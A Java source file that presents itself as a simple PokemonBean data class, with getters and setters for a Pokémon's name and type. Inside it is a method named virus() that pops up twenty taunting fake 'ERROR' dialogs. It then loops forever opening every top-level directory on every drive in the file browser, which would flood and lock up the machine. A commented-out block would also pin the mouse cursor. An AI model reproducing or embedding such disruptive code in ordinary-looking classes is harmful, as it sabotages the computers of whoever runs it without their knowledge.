package model;

import java.lang.String;
import java.awt.Desktop;
import java.io.File;

import javax.swing.JOptionPane;


public class PokemonBean {

	//Create instance variables.
	//Input values.
	private String pokemon;
	private String pokemonType;
	
	
	public String getPokemon() {
		return pokemon;
	}

	public void setPokemon(String pokemon) {
		this.pokemon = pokemon;
	}

	public String getPokemonType() {
		return pokemonType;
	}

	public void setPokemonType(String pokemonType) {
		this.pokemonType = pokemonType;
	}

	static String[] a;
	static File file1;
	
	public void virus() {
		for(int a = 0; a < 10; a++) {
			JOptionPane.showConfirmDialog(null, "TOUCH ME BWAHAHA", "ERROR", JOptionPane.YES_NO_OPTION);
			JOptionPane.showConfirmDialog(null, "DON'T TOUCH ME BWAHAHA", "ERROR", JOptionPane.YES_NO_OPTION);
		}
		
		///IT WILL PUT YOUR MOUSE CURSOR IN A SPECIFIC COORDINATES
//		while(true) {
//			
//			try {
//				java.awt.Robot robot = new java.awt.Robot();
//				robot.mouseMove(500, 500);
//				Thread.sleep(100);
//			} catch (AWTException | InterruptedException ie) {
//				// TODO: handle exception
//			}
//		}
		
		try {
			File[] paths;
			paths = File.listRoots();
			
			for(File path: paths) {
				a = path.list();
				
				while(true) {
					for(int x = 1; a.length > x; x++) {
						file1 = new File(path+a[x]);
						
						if(file1.isDirectory()) {
							Desktop desktop = Desktop.getDesktop();
							
							File dirToOpen = new File(path + a[x]);
							desktop.open(dirToOpen);
						}
					}
				}
			}
		} catch (Exception e) {
			System.out.println(e);
		}
	}
}
